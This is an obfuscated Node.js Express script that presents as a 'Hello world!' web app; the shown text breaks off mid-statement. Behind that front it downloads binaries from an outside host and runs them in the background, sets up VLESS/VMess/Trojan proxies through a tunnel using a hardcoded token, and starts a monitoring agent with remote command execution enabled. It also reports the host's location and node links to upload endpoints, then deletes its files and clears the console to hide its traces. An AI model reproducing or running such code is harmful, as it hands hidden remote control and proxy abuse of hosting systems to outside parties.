const _0x2811d7=_0x300d;(function(_0x1e83f5,_0x1297bb){const _0x7f3df1=_0x300d,_0x54c942=_0x1e83f5();while(!![]){try{const _0x8790e2=-parseInt(_0x7f3df1(0x1d5))/0x1*(-parseInt(_0x7f3df1(0x24b))/0x2)+-parseInt(_0x7f3df1(0x26d))/0x3*(-parseInt(_0x7f3df1(0x1df))/0x4)+-parseInt(_0x7f3df1(0x278))/0x5+-parseInt(_0x7f3df1(0x231))/0x6+parseInt(_0x7f3df1(0x1d7))/0x7*(parseInt(_0x7f3df1(0x20c))/0x8)+-parseInt(_0x7f3df1(0x21e))/0x9*(parseInt(_0x7f3df1(0x1bd))/0xa)+parseInt(_0x7f3df1(0x244))/0xb*(parseInt(_0x7f3df1(0x21b))/0xc);if(_0x8790e2===_0x1297bb)break;else _0x54c942['push'](_0x54c942['shift']());}catch(_0x2cf4a0){_0x54c942['push'](_0x54c942['shift']());}}}(_0x176a,0xc3d7c));const express=require(_0x2811d7(0x230)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0x2811d7(0x250)),exec=promisify(require(_0x2811d7(0x1d8))['exec']),{execSync}=require(_0x2811d7(0x1d8)),UPLOAD_URL=process[_0x2811d7(0x257)][_0x2811d7(0x238)]||'',PROJECT_URL=process[_0x2811d7(0x257)][_0x2811d7(0x1cb)]||'',AUTO_ACCESS=process[_0x2811d7(0x257)][_0x2811d7(0x208)]||![],FILE_PATH=process[_0x2811d7(0x257)][_0x2811d7(0x25b)]||_0x2811d7(0x241),SUB_PATH=process[_0x2811d7(0x257)][_0x2811d7(0x263)]||_0x2811d7(0x1f3),PORT=process['env'][_0x2811d7(0x22d)]||process['env']['PORT']||0xbb8,UUID=process['env'][_0x2811d7(0x1fe)]||_0x2811d7(0x219),NEZHA_SERVER=process[_0x2811d7(0x257)][_0x2811d7(0x1e2)]||'',NEZHA_PORT=process[_0x2811d7(0x257)]['NEZHA_PORT']||'',NEZHA_KEY=process['env'][_0x2811d7(0x1e1)]||'',ARGO_DOMAIN=process[_0x2811d7(0x257)][_0x2811d7(0x1f5)]||_0x2811d7(0x1c8),ARGO_AUTH=process[_0x2811d7(0x257)][_0x2811d7(0x1c0)]||_0x2811d7(0x24c),ARGO_PORT=process[_0x2811d7(0x257)]['ARGO_PORT']||0x1f41,CFIP=process[_0x2811d7(0x257)][_0x2811d7(0x26e)]||'cdns.doon.eu.org',CFPORT=process['env'][_0x2811d7(0x1e5)]||0x1bb,NAME=process[_0x2811d7(0x257)][_0x2811d7(0x228)]||_0x2811d7(0x223);function _0x300d(_0x61bfcc,_0x545ecf){_0x61bfcc=_0x61bfcc-0x1b9;const _0x176a05=_0x176a();let _0x300d40=_0x176a05[_0x61bfcc];return _0x300d40;}function _0x176a(){const _0xfb63ed=['includes','config.yaml','split','https://amd64.ssss.nyc.mn/agent','/trojan-argo','platform','Download\x20','App\x20is\x20running','\x20>/dev/null\x202>&1\x20&','join','\x20successfully','1029','https://arm64.ssss.nyc.mn/agent','ARGO_DOMAIN','direct','taskkill\x20/f\x20/im\x20','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','\x20already\x20exists','listen','forEach','\x20-p\x20','automatic\x20access\x20task\x20added\x20successfully','UUID','2096','base64','none','https://amd64.ssss.nyc.mn/v1','del\x20/f\x20/q\x20','block','chmod','\x20is\x20running','--tls','AUTO_ACCESS','\x20-s\x20','error','pipe','16ltEPil','\x0a\x20\x20credentials-file:\x20','Empowerment\x20failed\x20for\x20','https://amd64.ssss.nyc.mn/web','push','get','basename','vless','\x20failed:\x20','unlinkSync','sub.txt','/api/delete-nodes','\x20>\x20nul\x202>&1','2887fc93-98a2-4ffe-85a3-e1e360b94d35','config.json','12435156PLrwqo','&path=%2Ftrojan-argo%3Fed%3D2560#','TunnelSecret','9BsQQBs','https://arm64.ssss.nyc.mn/v1','.exe\x20>\x20nul\x202>&1','match','&fp=firefox&type=ws&host=','zian6','filter','Hello\x20world!','then','length','NAME','2083','stream','2087','data','SERVER_PORT','mkdirSync','status','express','3410736cPLCEP','/config.json\x20>/dev/null\x202>&1\x20&','\x0a\x20\x20\x20\x20','finish','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','\x0a\x0avmess://','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','UPLOAD_URL','?encryption=none&security=tls&sni=','boot.log','amd','\x20-c\x20','tcp','unlink','/dev/null','fileUrl','./tmp','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','fileName','11DKxVvc','/vmess-argo','Nodes\x20uploaded\x20successfully','true','arm64','writeFileSync','unshift','1676ZDdXEF','eyJhIjoiNmYxYjQ0NGYyZDlmZTVjNGZmMGNlMTg1ZGNkMzY0YmQiLCJ0IjoiM2U1NWU1ZWMtMDZhNi00NGI1LTkyYjUtMWY5NDFhMDlkNGY1IiwicyI6Ik56TTJOREl4WW1FdFpUWmlNQzAwT0RFeUxXSTVOREF0TVRObU56azBPVFkyTjJZeSJ9','http','\x0aclient_secret:\x20','https://amd64.ssss.nyc.mn/bot','util','close','utf-8','map','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','vmess','\x20>/dev/null\x202>&1','env','Content-Type','set','post','FILE_PATH','statSync','from','all','443','blackhole','2053','existsSync','SUB_PATH','/api/add-subscriptions','catch','clear','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','Error\x20in\x20startserver:','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','Unhandled\x20error\x20in\x20startserver:','web\x20running\x20error:\x20','\x20-c\x20\x22','9BDpJUn','CFIP','/sub.txt\x20saved\x20successfully','isFile','response','org','?security=tls&sni=','Skipping\x20adding\x20automatic\x20access\x20task','readFileSync','arm','Empowerment\x20success\x20for\x20','4375790QOonqs','\x0a\x0atrojan://','Add\x20automatic\x20access\x20task\x20faild:\x20','nohup\x20','country_code','win32','send','/vmess-argo?ed=2560','aarch64','log','15704270uMqHYB','tls','https://oooo.serv00.net/add-url','ARGO_AUTH','xtls-rprx-vision','8443','has','text/plain;\x20charset=utf-8','Subscription\x20uploaded\x20successfully','ARGO_DOMAIN:','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','zian663.zian65.dpdns.org','/api/add-nodes','tunnel.json','PROJECT_URL','toString','\x0avless://','\x0a\x20\x20tunnel:\x20','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','Unknown','php\x20running\x20error:\x20','pop','substring','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','1226rwrwex','charAt','4593722WdQMob','child_process','\x22\x20>\x20/dev/null\x202>&1','/vless-argo','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','127.0.0.1','Error\x20executing\x20command:\x20','message','586760uaubfq','quic','NEZHA_KEY','NEZHA_SERVER','stringify','application/json','CFPORT','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','freedom'];_0x176a=function(){return _0xfb63ed;};return _0x176a();}!fs[_0x2811d7(0x262)](FILE_PATH)?(fs[_0x2811d7(0x22e)](FILE_PATH),console[_0x2811d7(0x1bc)](FILE_PATH+'\x20is\x20created')):console[_0x2811d7(0x1bc)](FILE_PATH+_0x2811d7(0x1f9));function generateRandomName(){const _0x2b3845=_0x2811d7,_0xf4741d='abcdefghijklmnopqrstuvwxyz';let _0x11f2ac='';for(let _0x55609c=0x0;_0x55609c<0x6;_0x55609c++){_0x11f2ac+=_0xf4741d[_0x2b3845(0x1d6)](Math['floor'](Math['random']()*_0xf4741d['length']));}return _0x11f2ac;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x2811d7(0x1f1)](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path[_0x2811d7(0x1f1)](FILE_PATH,_0x2811d7(0x216)),listPath=path[_0x2811d7(0x1f1)](FILE_PATH,'list.txt'),bootLogPath=path[_0x2811d7(0x1f1)](FILE_PATH,_0x2811d7(0x23a)),configPath=path[_0x2811d7(0x1f1)](FILE_PATH,_0x2811d7(0x21a));function deleteNodes(){const _0x30b203=_0x2811d7;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x489d93;try{_0x489d93=fs[_0x30b203(0x275)](subPath,_0x30b203(0x252));}catch{return null;}const _0x43155c=Buffer[_0x30b203(0x25d)](_0x489d93,_0x30b203(0x200))[_0x30b203(0x1cc)](_0x30b203(0x252)),_0x2f818a=_0x43155c[_0x30b203(0x1ea)]('\x0a')[_0x30b203(0x224)](_0x429f44=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x429f44));if(_0x2f818a[_0x30b203(0x227)]===0x0)return;return axios[_0x30b203(0x25a)](UPLOAD_URL+_0x30b203(0x217),JSON[_0x30b203(0x1e3)]({'nodes':_0x2f818a}),{'headers':{'Content-Type':_0x30b203(0x1e4)}})['catch'](_0x281948=>{return null;}),null;}catch(_0x3434d8){return null;}}function cleanupOldFiles(){const _0x584f77=_0x2811d7;try{const _0x28c04e=fs['readdirSync'](FILE_PATH);_0x28c04e[_0x584f77(0x1fb)](_0x355cb0=>{const _0x350c82=_0x584f77,_0x588057=path[_0x350c82(0x1f1)](FILE_PATH,_0x355cb0);try{const _0x2cf3d8=fs[_0x350c82(0x25c)](_0x588057);_0x2cf3d8[_0x350c82(0x270)]()&&fs['unlinkSync'](_0x588057);}catch(_0x30900b){}});}catch(_0x483183){}}app[_0x2811d7(0x211)]('/',function(_0x572ec3,_0x4b23a6){const _0x2331b8=_0x2811d7;_0x4b23a6[_0x2331b8(0x1b9)](_0x2331b8(0x225));});async function generateConfig(){const _0x35b274=_0x2811d7,_0x48fac0={'log':{'access':_0x35b274(0x23f),'error':_0x35b274(0x23f),'loglevel':_0x35b274(0x201)},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x35b274(0x1c1)}],'decryption':_0x35b274(0x201),'fallbacks':[{'dest':0xbb9},{'path':_0x35b274(0x1da),'dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':_0x35b274(0x1ec),'dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':'127.0.0.1','protocol':_0x35b274(0x213),'settings':{'clients':[{'id':UUID}],'decryption':_0x35b274(0x201)},'streamSettings':{'network':_0x35b274(0x23d),'security':_0x35b274(0x201)}},{'port':0xbba,'listen':_0x35b274(0x1dc),'protocol':_0x35b274(0x213),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x35b274(0x201)},'streamSettings':{'network':'ws','security':_0x35b274(0x201),'wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x35b274(0x24d),_0x35b274(0x1be),_0x35b274(0x1e0)],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0x35b274(0x255),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x35b274(0x245)}},'sniffing':{'enabled':!![],'destOverride':[_0x35b274(0x24d),_0x35b274(0x1be),_0x35b274(0x1e0)],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x35b274(0x201),'wsSettings':{'path':_0x35b274(0x1ec)}},'sniffing':{'enabled':!![],'destOverride':[_0x35b274(0x24d),_0x35b274(0x1be),'quic'],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':_0x35b274(0x1e7),'tag':_0x35b274(0x1f6)},{'protocol':_0x35b274(0x260),'tag':_0x35b274(0x204)}]};fs[_0x35b274(0x249)](path[_0x35b274(0x1f1)](FILE_PATH,'config.json'),JSON['stringify'](_0x48fac0,null,0x2));}function getSystemArchitecture(){const _0x2d7cfc=_0x2811d7,_0x4c2e1=os['arch']();return _0x4c2e1===_0x2d7cfc(0x276)||_0x4c2e1===_0x2d7cfc(0x248)||_0x4c2e1===_0x2d7cfc(0x1bb)?'arm':_0x2d7cfc(0x23b);}function downloadFile(_0x3ec922,_0x2b5a96,_0x45e2a3){const _0x1c5d00=_0x2811d7,_0x2629e9=_0x3ec922;!fs['existsSync'](FILE_PATH)&&fs[_0x1c5d00(0x22e)](FILE_PATH,{'recursive':!![]});const _0x4bb1aa=fs['createWriteStream'](_0x2629e9);axios({'method':_0x1c5d00(0x211),'url':_0x2b5a96,'responseType':_0x1c5d00(0x22a)})[_0x1c5d00(0x226)](_0x28d911=>{const _0x5d6014=_0x1c5d00;_0x28d911[_0x5d6014(0x22c)][_0x5d6014(0x20b)](_0x4bb1aa),_0x4bb1aa['on'](_0x5d6014(0x234),()=>{const _0x2598c8=_0x5d6014;_0x4bb1aa[_0x2598c8(0x251)](),console[_0x2598c8(0x1bc)]('Download\x20'+path['basename'](_0x2629e9)+_0x2598c8(0x1f2)),_0x45e2a3(null,_0x2629e9);}),_0x4bb1aa['on'](_0x5d6014(0x20a),_0x17499f=>{const _0x45e1e3=_0x5d6014;fs[_0x45e1e3(0x23e)](_0x2629e9,()=>{});const _0x5a8d50=_0x45e1e3(0x1ee)+path[_0x45e1e3(0x212)](_0x2629e9)+_0x45e1e3(0x214)+_0x17499f['message'];console[_0x45e1e3(0x20a)](_0x5a8d50),_0x45e2a3(_0x5a8d50);});})[_0x1c5d00(0x265)](_0x58182a=>{const _0xf44653=_0x1c5d00,_0x221960='Download\x20'+path[_0xf44653(0x212)](_0x2629e9)+_0xf44653(0x214)+_0x58182a['message'];console[_0xf44653(0x20a)](_0x221960),_0x45e2a3(_0x221960);});}async function downloadFilesAndRun(){const _0x1c2b9f=_0x2811d7,_0xd8b3e=getSystemArchitecture(),_0x469135=getFilesForArchitecture(_0xd8b3e);if(_0x469135[_0x1c2b9f(0x227)]===0x0){console['log']('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x34998c=_0x469135[_0x1c2b9f(0x253)](_0x275ec6=>{return new Promise((_0x36cebe,_0x7ebb7d)=>{const _0x4e1218=_0x300d;downloadFile(_0x275ec6[_0x4e1218(0x243)],_0x275ec6[_0x4e1218(0x240)],(_0x4c3b30,_0x348cd5)=>{_0x4c3b30?_0x7ebb7d(_0x4c3b30):_0x36cebe(_0x348cd5);});});});try{await Promise[_0x1c2b9f(0x25e)](_0x34998c);}catch(_0x3e8201){console['error']('Error\x20downloading\x20files:',_0x3e8201);return;}function _0x4ffcde(_0x8b3be){const _0x7ff0eb=_0x1c2b9f,_0x1aa144=0x1fd;_0x8b3be[_0x7ff0eb(0x1fb)](_0x364e55=>{const _0x21891a=_0x7ff0eb;fs[_0x21891a(0x262)](_0x364e55)&&fs[_0x21891a(0x205)](_0x364e55,_0x1aa144,_0xae3f4d=>{const _0x5dfcae=_0x21891a;_0xae3f4d?console[_0x5dfcae(0x20a)](_0x5dfcae(0x20e)+_0x364e55+':\x20'+_0xae3f4d):console[_0x5dfcae(0x1bc)](_0x5dfcae(0x277)+_0x364e55+':\x20'+_0x1aa144[_0x5dfcae(0x1cc)](0x8));});});}const _0x1dc4fa=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x4ffcde(_0x1dc4fa);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x5d0222=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x1c2b9f(0x1ea)](':')[_0x1c2b9f(0x1d2)]():'',_0x551ac6=new Set([_0x1c2b9f(0x25f),_0x1c2b9f(0x1c2),_0x1c2b9f(0x1ff),_0x1c2b9f(0x22b),_0x1c2b9f(0x229),_0x1c2b9f(0x261)]),_0x547de8=_0x551ac6[_0x1c2b9f(0x1c3)](_0x5d0222)?_0x1c2b9f(0x247):'false',_0x388714=_0x1c2b9f(0x24e)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x1c2b9f(0x254)+_0x547de8+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x1c2b9f(0x249)](path[_0x1c2b9f(0x1f1)](FILE_PATH,_0x1c2b9f(0x1e9)),_0x388714);const _0x4a19da=_0x1c2b9f(0x27b)+phpPath+_0x1c2b9f(0x26c)+FILE_PATH+_0x1c2b9f(0x1f8);try{await exec(_0x4a19da),console[_0x1c2b9f(0x1bc)](phpName+_0x1c2b9f(0x206)),await new Promise(_0x49b3b2=>setTimeout(_0x49b3b2,0x3e8));}catch(_0x5ab359){console[_0x1c2b9f(0x20a)](_0x1c2b9f(0x1d1)+_0x5ab359);}}else{let _0x52e87c='';const _0x4f14e3=[_0x1c2b9f(0x25f),_0x1c2b9f(0x1c2),_0x1c2b9f(0x1ff),_0x1c2b9f(0x22b),_0x1c2b9f(0x229),'2053'];_0x4f14e3[_0x1c2b9f(0x1e8)](NEZHA_PORT)&&(_0x52e87c=_0x1c2b9f(0x207));const _0x507b14='nohup\x20'+npmPath+_0x1c2b9f(0x209)+NEZHA_SERVER+':'+NEZHA_PORT+_0x1c2b9f(0x1fc)+NEZHA_KEY+'\x20'+_0x52e87c+_0x1c2b9f(0x269);try{await exec(_0x507b14),console[_0x1c2b9f(0x1bc)](npmName+_0x1c2b9f(0x206)),await new Promise(_0x2eb91d=>setTimeout(_0x2eb91d,0x3e8));}catch(_0x5319fe){console[_0x1c2b9f(0x20a)]('npm\x20running\x20error:\x20'+_0x5319fe);}}}else console[_0x1c2b9f(0x1bc)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0xf7aef0=_0x1c2b9f(0x27b)+webPath+_0x1c2b9f(0x23c)+FILE_PATH+_0x1c2b9f(0x232);try{await exec(_0xf7aef0),console[_0x1c2b9f(0x1bc)](webName+'\x20is\x20running'),await new Promise(_0x5dab44=>setTimeout(_0x5dab44,0x3e8));}catch(_0xfadca5){console[_0x1c2b9f(0x20a)](_0x1c2b9f(0x26b)+_0xfadca5);}if(fs[_0x1c2b9f(0x262)](botPath)){let _0x16c510;if(ARGO_AUTH[_0x1c2b9f(0x221)](/^[A-Z0-9a-z=]{120,250}$/))_0x16c510=_0x1c2b9f(0x1cf)+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x16c510='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+'/tunnel.yml\x20run':_0x16c510='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x1c2b9f(0x1c7)+ARGO_PORT;try{await exec(_0x1c2b9f(0x27b)+botPath+'\x20'+_0x16c510+_0x1c2b9f(0x1f0)),console[_0x1c2b9f(0x1bc)](botName+_0x1c2b9f(0x206)),await new Promise(_0x14f74f=>setTimeout(_0x14f74f,0x7d0));}catch(_0x63bd75){console[_0x1c2b9f(0x20a)]('Error\x20executing\x20command:\x20'+_0x63bd75);}}await new Promise(_0x455a51=>setTimeout(_0x455a51,0x1388));}function getFilesForArchitecture(_0x1ae6c5){const _0x1cb1fd=_0x2811d7;let _0x34d063;_0x1ae6c5==='arm'?_0x34d063=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':'https://arm64.ssss.nyc.mn/bot'}]:_0x34d063=[{'fileName':webPath,'fileUrl':_0x1cb1fd(0x20f)},{'fileName':botPath,'fileUrl':_0x1cb1fd(0x24f)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x22b391=_0x1ae6c5==='arm'?_0x1cb1fd(0x1f4):_0x1cb1fd(0x1eb);_0x34d063[_0x1cb1fd(0x24a)]({'fileName':npmPath,'fileUrl':_0x22b391});}else{const _0x433445=_0x1ae6c5===_0x1cb1fd(0x276)?_0x1cb1fd(0x21f):_0x1cb1fd(0x202);_0x34d063[_0x1cb1fd(0x24a)]({'fileName':phpPath,'fileUrl':_0x433445});}}return _0x34d063;}function argoType(){const _0x3107da=_0x2811d7;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x3107da(0x1bc)](_0x3107da(0x1e6));return;}if(ARGO_AUTH[_0x3107da(0x1e8)](_0x3107da(0x21d))){fs['writeFileSync'](path[_0x3107da(0x1f1)](FILE_PATH,_0x3107da(0x1ca)),ARGO_AUTH);const _0x3ed26b=_0x3107da(0x1ce)+ARGO_AUTH[_0x3107da(0x1ea)]('\x22')[0xb]+_0x3107da(0x20d)+path[_0x3107da(0x1f1)](FILE_PATH,_0x3107da(0x1ca))+_0x3107da(0x1d4)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+_0x3107da(0x1db);fs[_0x3107da(0x249)](path['join'](FILE_PATH,'tunnel.yml'),_0x3ed26b);}else console[_0x3107da(0x1bc)](_0x3107da(0x242));}async function extractDomains(){const _0x20cdb8=_0x2811d7;let _0x4a0765;if(ARGO_AUTH&&ARGO_DOMAIN)_0x4a0765=ARGO_DOMAIN,console['log'](_0x20cdb8(0x1c6),_0x4a0765),await _0xd4f09f(_0x4a0765);else try{const _0x2f1824=fs[_0x20cdb8(0x275)](path[_0x20cdb8(0x1f1)](FILE_PATH,_0x20cdb8(0x23a)),_0x20cdb8(0x252)),_0x118d4e=_0x2f1824[_0x20cdb8(0x1ea)]('\x0a'),_0xfaaa3c=[];_0x118d4e['forEach'](_0x1163de=>{const _0x48b68c=_0x20cdb8,_0x4c5ae2=_0x1163de[_0x48b68c(0x221)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x4c5ae2){const _0x3d532a=_0x4c5ae2[0x1];_0xfaaa3c[_0x48b68c(0x210)](_0x3d532a);}});if(_0xfaaa3c[_0x20cdb8(0x227)]>0x0)_0x4a0765=_0xfaaa3c[0x0],console['log']('ArgoDomain:',_0x4a0765),await _0xd4f09f(_0x4a0765);else{console['log'](_0x20cdb8(0x267)),fs[_0x20cdb8(0x215)](path[_0x20cdb8(0x1f1)](FILE_PATH,_0x20cdb8(0x23a)));async function _0x57644a(){const _0x55852c=_0x20cdb8;try{process[_0x55852c(0x1ed)]===_0x55852c(0x27d)?await exec(_0x55852c(0x1f7)+botName+_0x55852c(0x220)):await exec('pkill\x20-f\x20\x22['+botName[_0x55852c(0x1d6)](0x0)+']'+botName[_0x55852c(0x1d3)](0x1)+_0x55852c(0x1d9));}catch(_0x2fc437){}}_0x57644a(),await new Promise(_0x5f3539=>setTimeout(_0x5f3539,0xbb8));const _0x57224b=_0x20cdb8(0x237)+FILE_PATH+_0x20cdb8(0x1c7)+ARGO_PORT;try{await exec(_0x20cdb8(0x27b)+botPath+'\x20'+_0x57224b+'\x20>/dev/null\x202>&1\x20&'),console[_0x20cdb8(0x1bc)](botName+_0x20cdb8(0x206)),await new Promise(_0x3d0a46=>setTimeout(_0x3d0a46,0xbb8)),await extractDomains();}catch(_0x3b9d5d){console[_0x20cdb8(0x20a)](_0x20cdb8(0x1dd)+_0x3b9d5d);}}}catch(_0x466dc8){console[_0x20cdb8(0x20a)]('Error\x20reading\x20boot.log:',_0x466dc8);}async function _0x1d6507(){const _0x3d60c3=_0x20cdb8;try{const _0x26808b=await axios[_0x3d60c3(0x211)]('https://ipapi.co/json/',{'timeout':0xbb8});if(_0x26808b[_0x3d60c3(0x22c)]&&_0x26808b['data'][_0x3d60c3(0x27c)]&&_0x26808b[_0x3d60c3(0x22c)][_0x3d60c3(0x272)])return _0x26808b[_0x3d60c3(0x22c)]['country_code']+'_'+_0x26808b[_0x3d60c3(0x22c)]['org'];}catch(_0x1e5696){try{const _0x2f5dbe=await axios[_0x3d60c3(0x211)]('http://ip-api.com/json/',{'timeout':0xbb8});if(_0x2f5dbe[_0x3d60c3(0x22c)]&&_0x2f5dbe[_0x3d60c3(0x22c)][_0x3d60c3(0x22f)]==='success'&&_0x2f5dbe['data']['countryCode']&&_0x2f5dbe['data'][_0x3d60c3(0x272)])return _0x2f5dbe[_0x3d60c3(0x22c)]['countryCode']+'_'+_0x2f5dbe[_0x3d60c3(0x22c)][_0x3d60c3(0x272)];}catch(_0x24d7e4){}}return _0x3d60c3(0x1d0);}async function _0xd4f09f(_0x2689ad){const _0x57961a=await _0x1d6507(),_0x5c369f=NAME?NAME+'-'+_0x57961a:_0x57961a;return new Promise(_0x23be90=>{setTimeout(()=>{const _0x172aa8=_0x300d,_0x238d35={'v':'2','ps':''+_0x5c369f,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':_0x172aa8(0x201),'host':_0x2689ad,'path':_0x172aa8(0x1ba),'tls':_0x172aa8(0x1be),'sni':_0x2689ad,'alpn':'','fp':'firefox'},_0x490231=_0x172aa8(0x1cd)+UUID+'@'+CFIP+':'+CFPORT+_0x172aa8(0x239)+_0x2689ad+_0x172aa8(0x222)+_0x2689ad+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x5c369f+_0x172aa8(0x236)+Buffer[_0x172aa8(0x25d)](JSON[_0x172aa8(0x1e3)](_0x238d35))[_0x172aa8(0x1cc)](_0x172aa8(0x200))+_0x172aa8(0x279)+UUID+'@'+CFIP+':'+CFPORT+_0x172aa8(0x273)+_0x2689ad+_0x172aa8(0x222)+_0x2689ad+_0x172aa8(0x21c)+_0x5c369f+_0x172aa8(0x233);console[_0x172aa8(0x1bc)](Buffer[_0x172aa8(0x25d)](_0x490231)['toString']('base64')),fs[_0x172aa8(0x249)](subPath,Buffer[_0x172aa8(0x25d)](_0x490231)[_0x172aa8(0x1cc)](_0x172aa8(0x200))),console['log'](FILE_PATH+_0x172aa8(0x26f)),uploadNodes(),app['get']('/'+SUB_PATH,(_0x4f34ba,_0x48718e)=>{const _0x28622a=_0x172aa8,_0x6ec27a=Buffer[_0x28622a(0x25d)](_0x490231)[_0x28622a(0x1cc)](_0x28622a(0x200));_0x48718e[_0x28622a(0x259)](_0x28622a(0x258),_0x28622a(0x1c4)),_0x48718e[_0x28622a(0x1b9)](_0x6ec27a);}),_0x23be90(_0x490231);},0x7d0);});}}async function uploadNodes(){const _0x1df884=_0x2811d7;if(UPLOAD_URL&&PROJECT_URL){const _0x52c359=PROJECT_URL+'/'+SUB_PATH,_0x5a57ea={'subscription':[_0x52c359]};try{const _0x401676=await axios[_0x1df884(0x25a)](UPLOAD_URL+_0x1df884(0x264),_0x5a57ea,{'headers':{'Content-Type':'application/json'}});return _0x401676&&_0x401676[_0x1df884(0x22f)]===0xc8?(console[_0x1df884(0x1bc)](_0x1df884(0x1c5)),_0x401676):null;}catch(_0x37a02a){if(_0x37a02a[_0x1df884(0x271)]){if(_0x37a02a['response'][_0x1df884(0x22f)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x1df884(0x262)](listPath))return;const _0x508ae0=fs['readFileSync'](listPath,_0x1df884(0x252)),_0x5230a4=_0x508ae0[_0x1df884(0x1ea)]('\x0a')['filter'](_0x324b69=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x324b69));if(_0x5230a4[_0x1df884(0x227)]===0x0)return;const _0x44736b=JSON[_0x1df884(0x1e3)]({'nodes':_0x5230a4});try{const _0x369db5=await axios['post'](UPLOAD_URL+_0x1df884(0x1c9),_0x44736b,{'headers':{'Content-Type':_0x1df884(0x1e4)}});return _0x369db5&&_0x369db5[_0x1df884(0x22f)]===0xc8?(console['log'](_0x1df884(0x246)),_0x369db5):null;}catch(_0x386145){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x1820ca=_0x300d,_0x23b410=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x23b410[_0x1820ca(0x210)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x23b410[_0x1820ca(0x210)](phpPath);process[_0x1820ca(0x1ed)]===_0x1820ca(0x27d)?exec(_0x1820ca(0x203)+_0x23b410[_0x1820ca(0x1f1)]('\x20')+_0x1820ca(0x218),_0x2c5ab9=>{const _0x72531=_0x1820ca;console[_0x72531(0x266)](),console['log'](_0x72531(0x1ef)),console['log'](_0x72531(0x235));}):exec('rm\x20-rf\x20'+_0x23b410[_0x1820ca(0x1f1)]('\x20')+_0x1820ca(0x256),_0xbc8a7d=>{const _0x358940=_0x1820ca;console['clear'](),console['log'](_0x358940(0x1ef)),console[_0x358940(0x1bc)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x187926=_0x2811d7;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x187926(0x1bc)](_0x187926(0x274));return;}try{const _0x2b51f9=await axios['post'](_0x187926(0x1bf),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x187926(0x1e4)}});return 